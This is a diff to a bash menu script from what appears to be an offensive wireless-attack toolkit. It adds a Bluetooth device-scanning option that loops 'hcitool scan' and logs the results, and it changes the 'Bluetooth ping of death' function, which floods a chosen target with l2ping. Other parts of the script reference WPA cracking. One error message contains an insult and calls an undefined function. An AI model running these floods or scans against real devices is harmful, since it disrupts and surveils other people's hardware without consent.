@@ -38,14 +38,15 @@ printf "\e[0m--------------------------" | lolcat -F 3
 
 printf "
 (7) BLUETOOTH POD
+(8) BLUETOOTH SCAN
 "
 printf "\e[0m--------------------------" | lolcat -F 3
 printf "
-(8) SETTINGS
+(9) SETTINGS
 "
 printf "\e[0m--------------------------" | lolcat -F 3
 printf "
-(9) EXIT\n
+(10) EXIT\n
 " 
 
 read -p "SELECT: " auramenu
@@ -65,9 +66,11 @@ case $auramenu in
     
     7) bt_pod ;;
     
-    8) settings ;;
+    8) bt_scan ;;
     
-    9) exit ; clear ;;
+    9) settings ;;
+    
+    10) exit ; clear ;;
     
     *) printf "\e[93mINCORRECT OPTION...\n"; exit;;
     esac
@@ -814,7 +817,7 @@ wpa_crack()
                     auramenu
                     ;;
                 [nN][oO]|[nN])
-                    printf "\e[96mBACKING TO MENU..."
+                    printf "\e[93mBACKING TO MENU..."
                     sleep 1.2
                     auramenu
                     ;;
@@ -875,7 +878,7 @@ check1()
                     auramenu
                     ;;
                 [nN][oO]|[nN])
-                    printf "\e[96mBACKING TO MENU..."
+                    printf "\e[93mBACKING TO MENU..."
                     sleep 1.2
                     auramenu
                     ;;
@@ -899,7 +902,7 @@ check2()
                     auramenu
                     ;;
                 [nN][oO]|[nN])
-                    printf "\e[96mBACKING TO MENU..."
+                    printf "\e[93mBACKING TO MENU..."
                     sleep 1.2
                     auramenu
                     ;;
@@ -913,18 +916,44 @@ bt_pod()
 {
     banner
     printf "\e[0m\n"
-    read -p "BT INTERFACE: " device
+    read -p "INTERFACE: " device
     read -p "TARGET: " target
-    printf "\e[96mSTARTING BT PING OF DEATH ATTACK...\n"
+    printf "\e[93mSTARTING BT PING OF DEATH ATTACK...\n"
     hciconfig $device up
-    l2ping -i $device -s 65531 -f $target
+    l2ping -i $device -s 5000 -f $target
     printf "DONE!\n"
     read -p "press [ENTER] to back" variable
     auramenu
 }
 
-
-
+bt_scan()
+{
+    banner
+    printf "\e[0m\n"
+    read -p "INTERFACE: " device
+    read -p "SAVE LOGS? (y/n): " logs
+    case $logs in
+        [yY][eE][sS]|[yY])
+            read -p "OUTPUT: " log
+            printf "\n\e[93mSTARTING SCAN...\n"
+            hciconfig $device up
+            while [ 1 ]; do hcitool scan >> $log;printf "\n\e[93mDONE!\nRETRYING... HIT CTRL+C TO KILL\e[0m\n";done
+            printf "\nDONE!\n"
+            read -p "press [ENTER] to back" variable
+            auramenu
+            ;;
+        [nN][oO]|[nN])
+            printf "\n\e[93mSTARTING SCAN...\e[0m\n"
+            hciconfig $device up
+            while [ 1 ]; do hcitool scan;printf "\n\e[93mRETRYING... HIT CTRL+C TO KILL\e[0m\n";done
+            printf "[*] Scan complete\n"
+            read -p "press [ENTER] to back" variable
+            auramenu
+            ;;
+        *) printf "\e[91m[*]\e[37mError 404: Select something bitch!"; sleep 1.5; f_btscan
+        ;;
+    esac
+}
 
 rootcheck
 auramenu 
